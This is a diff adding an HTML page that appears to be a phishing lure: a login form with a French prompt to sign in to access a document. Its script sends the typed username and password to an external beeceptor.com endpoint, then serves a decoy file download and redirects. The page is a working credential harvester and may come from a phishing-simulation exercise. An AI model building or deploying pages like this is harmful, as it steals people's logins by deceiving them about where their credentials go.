@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Form with File Download</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+        }
+        .login-container {
+            max-width: 300px;
+            margin: 100px auto;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .login-container h2 {
+            text-align: center;
+        }
+        .login-container input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            box-sizing: border-box;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+ 
+<div class="login-container">
+    <h2>Pour accéder à ce document, veuillez vous connecter.</h2>
+    <form id="loginForm">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username" required>
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required>
+        
+        <button type="submit">Login</button>
+    </form>
+</div>
+ 
+<script>
+    const website = "https://formind.free.beeceptor.com/"
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+ 
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+ 
+        fetch(website + '/login', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ username: username, password: password })
+        })
+        .then(response => response.json())
+        .then(data => {
+            downloadFile();
+            setTimeout(() => { window.location.href = website + '/success' }, 1000)
+        })
+        .catch(error => {
+            console.error('Error:', error);
+        });
+    });
+ 
+    // Function to download the file after successful login
+    function downloadFile() {
+        const base64Data = 'data:application/octet-stream;base64,SGVsbG8gd29ybGQh'; // Example base64 data
+        const filename = 'example.txt'; // Change this to the desired file name
+ 
+        const link = document.createElement('a');
+        link.href = base64Data;
+link.download = filename;
+        document.body.appendChild(link);
+link.click();
+        document.body.removeChild(link);
+    }
+</script>
+ 
+</body>
+</html>
